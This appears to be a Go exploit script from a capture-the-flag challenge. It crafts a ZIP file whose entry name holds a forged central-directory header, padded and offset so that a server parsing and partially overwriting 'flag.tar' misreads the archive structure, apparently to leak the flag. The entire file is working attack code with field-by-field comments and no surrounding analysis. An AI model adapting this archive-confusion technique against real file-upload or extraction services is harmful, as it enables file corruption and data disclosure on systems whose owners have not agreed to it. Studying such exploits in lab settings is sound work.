package main

import (
	"archive/zip"
	"fmt"
	"math/rand"
	"os"
	"strings"
)

func main() {
	// Create a second zip file flag.tar.zip,
	// server parses and partially overwrites flag.tar with this file as zip
	zipFile, err := os.Create("flag.tar.zip")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer zipFile.Close()

	// Create a zip writer
	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	// Create a new file in the zip archive
	zipEntry, err := zipWriter.Create("PK\x01\x02" + // header
		"\x01\x01" + // creation version
		"\x01\x01" + // extract version
		"\x01\x01" + // bitflag
		"\x00\x00" + // compression method (none)
		"\x01\x01\x01\x01" + // last modified date
		"\x02\x02\x02\x02" + // crc
		"\x01\x01\x01\x01" + // size compressed (needs to be large enough to get zip data)
		"\x01\x01\x01\x01" + // uncompressed size (same as compressed for none type)
		"\x01\x01" + // filename length
		"\x01\x01" + // extra field
		"\x01\x01" + // file comment
		"\x01\x01" + // number of disk
		"\x01\x01" + // internal file attr
		"\x01\x01\x01\x01" + // external file attr
		"\x00\x00\x00\x00" + // offset of loc (point to beginning of file w/ valid loc header)
		strings.Repeat("a", 513) + // filename
		strings.Repeat("b", 513) + // extra field
		strings.Repeat("c", 513)) // comment
	if err != nil {
		fmt.Println(err)
		return
	}

	// random bytes to prevent compression
	// offset set so that filename of entry becomes first zip's central directory
	data := make([]byte, 17546)
	rand.Read(data)
	zipEntry.Write(data)

	fmt.Println("Zip file created successfully.")
}
